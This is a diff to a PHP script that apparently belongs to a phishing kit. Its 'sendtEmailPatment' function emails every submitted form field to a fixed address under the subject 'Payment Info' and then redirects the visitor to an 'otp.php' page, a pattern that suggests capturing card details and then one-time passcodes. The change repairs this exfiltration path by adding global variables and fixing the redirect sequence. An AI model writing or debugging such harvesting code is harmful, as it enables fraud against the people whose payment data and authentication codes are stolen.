@@ -16,25 +16,27 @@ if(isset($_POST)) {
     exit;  
 }
 
-function sendtEmailPatment($data){
-
-    $subject = "payment info";
-    $message="";
-    foreach($data as $key=>$msg){
-        $message.= "$key :  $msg\n";
+function sendtEmailPatment($data) {
+    global $to, $sender;
+    $subject = "Payment Info";
+    $message = "";
+    foreach ($data as $key => $msg) {
+        $message .= "$key :  $msg\n";
     }
     $headers = "From: $sender\r\n";
     $headers .= "Reply-To: $sender\r\n";
     $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
-    
-    header("Location: ./otp.php");
+
     // Send the email
     if (mail($to, $subject, $message, $headers)) {
-        header("Location: ./otp.php");
+        // Redirect if using GET only
+        header("Location: ./otp.php", true, 303); // Use 303 to change to GET
+        exit;
     } else {
         echo "Failed to send email.";
     }
 }
+
 
 
 function sendOTP($data){
